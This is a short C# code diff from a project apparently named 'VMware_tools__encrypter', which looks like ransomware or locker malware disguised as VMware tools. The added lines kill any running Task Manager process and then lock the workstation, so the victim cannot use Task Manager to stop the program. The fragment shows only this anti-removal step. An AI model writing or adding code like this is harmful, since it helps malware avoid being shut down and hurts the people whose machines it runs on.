@@ -418,7 +418,12 @@ namespace VMware_tools__encrypter
                 {
                     if (System.Diagnostics.Process.GetProcessesByName("taskmgr").ToList().Count > 0)
                     {
+                        foreach (System.Diagnostics.Process p in System.Diagnostics.Process.GetProcessesByName("taskmgr"))
+                        {
+                            p.Kill();
+                        }
                         LockWorkStation();
+                        
                     }
                 }
 
